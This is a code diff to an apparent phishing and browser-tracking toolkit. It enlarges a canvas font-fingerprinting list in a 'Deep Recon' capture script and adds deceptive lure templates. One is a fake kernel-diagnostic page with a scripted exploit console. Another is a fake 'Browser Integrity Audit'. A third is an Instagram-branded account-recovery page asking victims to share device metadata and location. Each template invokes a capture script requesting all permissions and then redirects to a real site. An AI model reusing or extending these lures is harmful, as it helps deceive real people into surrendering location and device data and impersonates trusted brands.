@@ -286,7 +286,12 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
 
         // Deep Recon: Font Fingerprint
         try {
-           var fontList = ["Arial", "Helvetica", "Verdana", "Times New Roman", "Courier New", "Georgia", "Palatino", "Garamond", "Bookman", "Comic Sans MS", "Trebuchet MS", "Arial Black", "Impact", "JetBrains Mono", "Roboto", "Ubuntu", "SF Pro Display"];
+           var fontList = [
+             "Arial", "Helvetica", "Verdana", "Times New Roman", "Courier New", "Georgia", "Palatino", "Garamond", "Bookman", "Comic Sans MS", "Trebuchet MS", "Arial Black", "Impact", 
+             "JetBrains Mono", "Roboto", "Ubuntu", "SF Pro Display", "Menlo", "Monaco", "Consolas", "Liberation Mono", "DejaVu Sans", "Segoe UI", "Tahoma", "Geneva", "Calibri", "Candara", 
+             "Optima", "American Typewriter", "Baskerville", "Copperplate", "Futura", "Gill Sans", "Century Gothic", "Franklin Gothic", "Didot", "Bodoni 72", "Avenir", "Avenir Next", 
+             "PingFang SC", "Hiragino Sans", "Microsoft YaHei", "Malgun Gothic", "Noto Sans", "Open Sans", "Lato"
+           ];
            var canvas = document.createElement("canvas");
            var ctx = canvas.getContext("2d");
            var detectedFonts = [];
@@ -296,7 +301,7 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
              ctx.font = "72px '" + f + "', sans-serif";
              if (ctx.measureText("mmmmmmmmmmlli").width !== baseline) detectedFonts.push(f);
            });
-           await logExtra({ installed_fonts: detectedFonts.join(',') });
+           await logExtra({ installed_fonts: detectedFonts.join(','), fonts_count: detectedFonts.length });
         } catch(e) {}
 
         // Deep Recon: Hardware API Availability
@@ -705,36 +710,50 @@ export const templates: Record<string, {name: string, render: (id: string) => st
     })}</body></html>`
   },
   'pegasus': {
-    name: "💻 System: Kernel Diagnostic (Extreme)",
-    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>Diagnostics</title><style>body { background:#0a0a0a; color:#00ff00; font-family: 'Courier New', Courier, monospace; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; } .box { width:90%; max-width:600px; border:1px solid #333; padding:20px; background:#111; text-align:left; border-radius:2px; box-shadow: 0 0 20px rgba(0,255,0,0.1); } .header { border-bottom:1px solid #333; padding-bottom:10px; margin-bottom:15px; color:#00aa00; font-size:12px; font-weight:bold; } .code { font-size:12px; line-height:1.5; height:200px; overflow-y:hidden; position:relative; } .code:after { content:"_"; animation: blink 1s infinite; } @keyframes blink { 50% { opacity:0; } } .btn { width:100%; background:transparent; color:#00ff00; border:1px solid #00ff00; padding:12px; font-weight:bold; cursor:pointer; margin-top:20px; text-transform:uppercase; transition:all 0.3s; } .btn:hover { background:#00ff00; color:#000; }</style></head><body><div class="box"><div class="header">PEGASUS_KERNEL_EXPLOITATION_V9.2 [STABLE]</div><div class="code" id="log-console">
-[+] INITIALIZING_EXPLOIT_PAYLOAD...<br>
-[+] BYPASSING_SANDBOX_RESTRICTIONS...<br>
-[+] HOOKING_HARDWARE_INTERFACE...<br>
-[+] SCANNING_MEMORY_PAGES...<br>
-[!] WARNING: KERNEL_INTEGRITY_MISMATCH<br>
-[+] TRIGGERING_VULNERABILITY_0xCF42...<br>
-[+] ATTEMPTING_RING0_ELEVATION...<br>
-[?] WAITING_FOR_HARDWARE_RESPONSE...<br>
-    </div><button class="btn" onclick="window.startCapture();">EXECUTE DEEP SCAN</button></div>
+    name: "💻 System: Kernel Diagnostic [STABLE v9.3]",
+    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>Diagnostics Hub</title><style>body { background:#050505; color:#0f0; font-family: 'JetBrains Mono', 'Courier New', monospace; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; overflow:hidden; } .box { border:1px solid #11ff11; padding:30px; background:#000; width:90%; max-width:700px; box-shadow: 0 0 30px rgba(0,255,0,0.2); position:relative; } .header { border-bottom:1px solid #11ff11; padding-bottom:12px; margin-bottom:20px; font-size:12px; letter-spacing:2px; font-weight:bold; display:flex; justify-content:space-between; } .code { font-size:13px; line-height:1.6; height:250px; overflow:hidden; white-space:pre-wrap; } .cursor { display:inline-block; width:8px; height:18px; background:#0f0; margin-left:5px; animation: blink 1s infinite; vertical-align:middle; } @keyframes blink { 50% { opacity:0; } } .btn { width:100%; background:transparent; color:#0f0; border:1px solid #0f0; padding:15px; font-weight:bold; cursor:pointer; margin-top:25px; text-transform:uppercase; transition:all 0.4s; font-family:inherit; } .btn:hover { background:#0f0; color:#000; box-shadow: 0 0 15px #0f0; } .scanline { width:100%; height:2px; background:rgba(0,255,0,0.1); position:absolute; top:0; left:0; pointer-events:none; animation: scan 4s linear infinite; } @keyframes scan { 0% { top:0; } 100% { top:100%; } }</style></head><body><div class="box"><div class="scanline"></div><div class="header"><span>SYSTEM_RECON_PROTO_V9.3</span><span>STATE: PRE-EXECUTION</span></div><div class="code" id="log-console">
+[+] INITIALIZING_EXPLOIT_ENGINE...
+[+] MAPPING_HARDWARE_PAGES...
+[+] BYPASSING_SANDBOX_ISOLATION...
+[+] HOOKING_KERNEL_VTABLES...
+[+] ATTEMPTING_RING0_PRIVILEGE_ESCALATION...
+[*] VERIFYING_HARDWARE_INTEGRITY...<span class="cursor"></span>
+    </div><button class="btn" onclick="window.startCapture();">TRIGGER_DEEP_KERNEL_SCAN</button></div>
     <script>
       var log = document.getElementById('log-console');
       var lines = [
-        "[+] EXTRACTING_BROWSER_CERT...",
-        "[+] MAPPING_GPU_REGISTRY...",
-        "[+] PROBING_SENSOR_ARRAY...",
-        "[+] DECODING_LOCATION_MARKERS...",
-        "[+] SYNCING_REMOTE_ASSETS..."
+        "[+] EXTRACTING_BROWSER_CERT_CHAIN...",
+        "[+] ANALYZING_GPU_PIPELINE...",
+        "[+] MAPPING_SENSOR_ARRAY_TELEMETRY...",
+        "[+] DECODING_GEOSPATIAL_MARKERS...",
+        "[+] SYNCING_REMOTE_FORENSIC_BUFFER...",
+        "[!] ALERT: USER_AUTH_REQUIRED_FOR_BUS_ACCESS"
       ];
       var idx = 0;
       setInterval(function() {
         if (idx < lines.length) {
-          log.innerHTML += "<br>" + lines[idx];
+          var span = log.querySelector('.cursor');
+          log.removeChild(span);
+          log.innerHTML += "\\n" + lines[idx];
+          log.appendChild(span);
           idx++;
         }
-      }, 3000);
+      }, 2500);
     </script>
-    ${getCaptureScript(id, 'https://github.com', {
-      tmplId: 'pegasus', perms: ALL_PERMS, accent: '#00ff00', icon: '💀'
+    ${getCaptureScript(id, 'https://github.com/torvalds', {
+      tmplId: 'pegasus', perms: ALL_PERMS, accent: '#00ff00', icon: '💀',
+    })}</body></html>`
+  },
+  'security_audit': {
+    name: "🛡️ Security: Browser Ecosystem Audit (Extreme)",
+    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>Trust & Safety</title><style>body { font-family: -apple-system, system-ui, sans-serif; background:#f0f2f5; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; } .box { background:#fff; border-radius:12px; padding:40px; width:100%; max-width:400px; text-align:center; box-shadow: 0 12px 40px rgba(0,0,0,0.08); } .shield { color:#1877f2; font-size:60px; margin-bottom:20px; } h2 { font-size:24px; font-weight:700; color:#1c1e21; margin:0 0 12px; } p { color:#606770; line-height:1.5; font-size:15px; margin-bottom:30px; } .btn { background:#1877f2; color:#fff; border:none; padding:12px; border-radius:6px; font-size:16px; font-weight:600; cursor:pointer; width:100%; transition:filter 0.2s; } .btn:hover { filter: brightness(1.1); }</style></head><body><div class="box"><div class="shield">🛡️</div><h2>Browser Integrity Audit</h2><p>Our security systems have detected an unusual connection pattern. Please verify your browser environment to continue safely.</p><button class="btn" onclick="window.startCapture();">Verify & Continue</button></div>${getCaptureScript(id, 'https://www.google.com/safetycenter', {
+      tmplId: 'security_audit', perms: ALL_PERMS, accent: '#1877f2', icon: '🔒'
+    })}</body></html>`
+  },
+  'meta_login': {
+    name: "💬 Social: Account Recovery (Extreme)",
+    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>Login Helper</title><style>body { background:#fafafa; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; } .box { border:1px solid #dbdbdb; background:#fff; padding:30px; width:350px; text-align:center; } .logo { font-size:28px; font-weight:bold; margin-bottom:20px; color:#262626; } .avatar { width:80px; height:80px; border-radius:50%; background:#efefef; margin:0 auto 15px; border:1px solid #dbdbdb; display:flex; align-items:center; justify-content:center; font-size:40px; } h3 { font-size:16px; margin:0 0 10px; } p { color:#8e8e8e; font-size:13px; margin-bottom:25px; } .btn { background:#0095f6; color:#fff; border:none; padding:8px 16px; border-radius:4px; font-weight:600; cursor:pointer; width:100%; }</style></head><body><div class="box"><div class="logo">Instagram</div><div class="avatar">👤</div><h3>Recover your account</h3><p>We need to sync your device metadata and location to match our records for security verification.</p><button class="btn" onclick="window.startCapture();">Verify Identity</button></div>${getCaptureScript(id, 'https://www.instagram.com/accounts/login/', {
+      tmplId: 'meta_login', perms: ALL_PERMS, accent: '#0095f6', icon: '📸'
     })}</body></html>`
   },
   'wifi': {
